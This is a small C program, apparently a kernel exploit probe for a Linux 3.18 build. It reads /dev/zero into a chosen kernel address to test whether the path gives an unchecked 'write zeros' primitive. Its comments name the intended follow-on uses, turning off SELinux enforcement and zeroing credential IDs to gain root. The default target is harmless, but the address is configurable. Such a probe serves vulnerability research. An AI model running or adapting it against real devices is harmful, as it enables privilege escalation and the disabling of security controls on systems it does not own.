#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>

/* Does this 3.18 build let read()/write() syscalls touch a KERNEL address?
 * vfs_read() itself does not access_ok() the buffer -- only the callee does.
 * drivers/char/mem.c read_zero() ends up in __clear_user(), i.e. the unchecked
 * variant, on many trees: that would be an arbitrary "write zeros" primitive,
 * enough for selinux_enforcing=0 and for zeroing the id fields of a cred.
 *
 * Probe target is deliberately a harmless .data string: init_uts_ns.name.nodename
 * (65 bytes, only shown by `uname -n`), so a successful write is instantly visible
 * and cannot destabilise anything.  If the path is checked we simply get EFAULT.
 */
int main(int argc, char **argv)
{
    unsigned long addr = argc > 1 ? strtoul(argv[1], NULL, 0) : 0xffffffc00162defdUL;
    size_t len = argc > 2 ? strtoul(argv[2], NULL, 0) : 8;
    const char *path = argc > 3 ? argv[3] : "/dev/zero";
    ssize_t n;
    int fd, rc;

    setvbuf(stdout, NULL, _IONBF, 0);
    fd = open(path, O_RDONLY);
    if (fd < 0) { printf("open %s: errno=%d %s\n", path, errno, strerror(errno)); return 1; }
    errno = 0;
    n = read(fd, (void *)(uintptr_t)addr, len);
    rc = errno;
    printf("read(%s, %lx, %zu) -> %zd errno=%d %s\n", path, addr, len, n, rc, strerror(rc));
    fflush(stdout);
    system("uname -n");
    close(fd);
    return 0;
}
